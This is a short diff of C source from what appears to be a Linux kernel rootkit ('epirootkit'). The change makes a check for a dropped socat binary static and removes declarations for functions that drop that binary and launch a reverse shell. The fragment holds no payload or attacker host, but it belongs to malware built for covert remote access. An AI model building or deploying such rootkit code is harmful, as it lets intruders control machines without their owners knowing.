@@ -12,11 +12,7 @@
 
 #include "epirootkit.h"
 
-int is_socat_binaire_dropped(void);
-int drop_socat_binaire(void);
-int launch_reverse_shell(char *args);
-
-int is_socat_binaire_dropped(void) {
+static int is_socat_binaire_dropped(void) {
     struct file *f;
     f = filp_open(SOCAT_BINARY_PATH, O_RDONLY, 0);
     if (IS_ERR(f))
